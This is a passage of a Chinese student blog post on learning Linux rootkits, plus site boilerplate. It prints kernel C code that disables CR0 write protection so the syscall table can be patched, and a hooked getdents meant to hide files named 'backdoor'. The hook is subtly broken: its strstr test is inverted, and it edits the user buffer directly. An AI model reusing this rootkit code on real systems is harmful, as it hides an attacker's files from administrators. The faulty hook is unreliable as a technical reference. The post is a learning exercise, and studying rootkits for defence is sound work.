+<h3 id="2-3-rootkit实现hook示例"><a href="#2-3-rootkit实现hook示例" class="headerlink" title="2.3 rootkit实现hook示例"></a>2.3 rootkit实现hook示例</h3><p>我们已经获得了系统调用，接下来要考虑的就是如何篡改系统调用了，基本思路是将SCT中指向正常系统调用的指针改成我们自己的函数地址。由于SCT原来是有写保护的，所以我们首先要取消写保护，写完之后恢复写保护，代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">disable_write_protection</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> cr0 = read_cr0();</span><br><span class="line">        clear_bit(<span class="number">16</span>, &amp;cr0);</span><br><span class="line">        write_cr0(cr0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">enable_write_protection</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> cr0 = read_cr0();</span><br><span class="line">        set_bit(<span class="number">16</span>, &amp;cr0);</span><br><span class="line">        write_cr0(cr0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来实现我们自己的系统调用，一般而言就是对系统原有的结果进行过滤，这里直接拿来老师的代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage <span class="keyword">long</span> <span class="title">my_getdents</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, struct linux_dirent __user *dirp,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">unsigned</span> <span class="keyword">int</span> count)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> *<span class="title">kdirp</span>,*<span class="title">kdirp2</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> value,tlen;</span><br><span class="line">    <span class="keyword">long</span> len = <span class="number">0</span>;</span><br><span class="line">    value = (*old_getdents) (fd, dirp, count);</span><br><span class="line">    tlen = value;</span><br><span class="line"></span><br><span class="line">    kdirp = (struct linux_dirent *) kmalloc(tlen, GFP_KERNEL);</span><br><span class="line">    kdirp2 = kdirp;</span><br><span class="line">    copy_from_user(kdirp, dirp, tlen);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(tlen &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        len = dirp-&gt;d_reclen;</span><br><span class="line">        tlen = tlen - len;</span><br><span class="line">        printk(<span class="string">"%s\n"</span>,dirp-&gt;d_name);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(dirp-&gt;d_name,<span class="string">"backdoor"</span>) == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            printk(<span class="string">"find file\n"</span>);</span><br><span class="line">            memmove(dirp, (<span class="keyword">char</span> *) dirp + dirp-&gt;d_reclen, tlen);</span><br><span class="line">            value = value - len;</span><br><span class="line">            printk(KERN_INFO <span class="string">"hide successful.\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(tlen)</span><br><span class="line">            dirp = (struct linux_dirent *) ((<span class="keyword">char</span> *)dirp + dirp-&gt;d_reclen);</span><br><span class="line">    &#125;</span><br><span class="line">    printk(KERN_INFO <span class="string">"finished hacked_getdents.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] <a href="http://blog.topspeedsnail.com/archives/10053" target="_blank" rel="noopener">编写第一个LInux内核模块</a></p>
+<p>[2] <a href="https://www.freebuf.com/articles/system/54263.html" target="_blank" rel="noopener">Linux rootkit系列</a>（一共三篇，两个作者，对于我理解相关内容有很打帮助)</p>
+<p>[3] <a href="https://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html?view=sidebar" target="_blank" rel="noopener">Linux Rootkits</a>（一样有三篇)</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/信息安全/" rel="tag"># 信息安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/12/科大域名启用/" rel="next" title="科大域名启用">
+                <i class="fa fa-chevron-left"></i> 科大域名启用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/12/Ubuntu18-04安装爬坑指南/" rel="prev" title="Ubuntu18.04安装爬坑指南">
+                Ubuntu18.04安装爬坑指南 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">安河桥南丶</p>
+              <p class="site-description motion-element" itemprop="description">言念君子，温其如玉</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-Rootkit学习"><span class="nav-number">1.</span> <span class="nav-text">Linux Rootkit学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-LKM内容"><span class="nav-number">1.1.</span> <span class="nav-text">1 LKM内容</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-LKM加载"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.1 LKM加载</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-隐藏系统模块"><span class="nav-number">1.1.2.</span> <span class="nav-text">1.2 隐藏系统模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-1-proc-modules隐藏"><span class="nav-number">1.1.3.</span> <span class="nav-text">1.2.1 /proc/modules隐藏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-2-sys-module隐藏"><span class="nav-number">1.1.4.</span> <span class="nav-text">1.2.2 sys/module隐藏</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-小结"><span class="nav-number">1.1.5.</span> <span class="nav-text">1.3 小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-初探rootkit"><span class="nav-number">1.2.</span> <span class="nav-text">2 初探rootkit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-系统调用"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1 系统调用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-查找sys-call-table地址"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.2 查找sys_call_table地址</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-1-从-boot-System-map中读取"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">2.2.1 从/boot/System.map中读取</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-2-确定大概范围然后将其与我们导出的符号进行比较"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">2.2.2 确定大概范围然后将其与我们导出的符号进行比较</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-2-3-通过IDT中断向量表来获取系统调用"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">2.2.3 通过IDT中断向量表来获取系统调用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#2-2-3-1-32位"><span class="nav-number">1.2.2.3.1.</span> <span class="nav-text">2.2.3.1 32位</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-2-3-2-64位"><span class="nav-number">1.2.2.3.2.</span> <span class="nav-text">2.2.3.2 64位</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-rootkit实现hook示例"><span class="nav-number">1.2.3.</span> <span class="nav-text">2.3 rootkit实现hook示例</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文献"><span class="nav-number">1.3.</span> <span class="nav-text">参考文献</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">安河桥南丶</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://yoursite.com/2019/10/12/LinuxRootkit学习/';
+          this.page.identifier = '2019/10/12/LinuxRootkit学习/';
+          this.page.title = 'LinuxRootkit学习';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("kKXp7FWzG4cWQTX0TRzR699g-gzGzoHsz", "wdNxNGHoAluFv0xXYnXhQwTm");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+
+  
+
+  
+
+</body>
+</html>
